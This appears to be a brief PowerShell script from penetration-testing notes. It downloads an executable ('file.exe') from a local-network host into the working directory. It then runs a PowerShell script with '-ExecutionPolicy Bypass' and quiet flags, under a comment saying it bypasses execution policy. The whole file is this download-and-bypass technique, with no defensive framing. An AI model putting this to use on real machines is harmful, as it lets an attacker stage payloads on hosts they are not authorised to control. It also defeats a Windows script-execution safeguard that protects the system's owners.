$storageDir = $pwd
$webclient = New-Object System.Net.WebClient
$url = "http://192.168.1.2/file.exe"
$file = "file.exe"
$webclient.DownloadFile($url,$file)

#Bypass execution policy
powershell.exe -ExecutionPolicy Bypass -NoLogo -NoInteractive -NoProfile -File wget-powershell.ps1
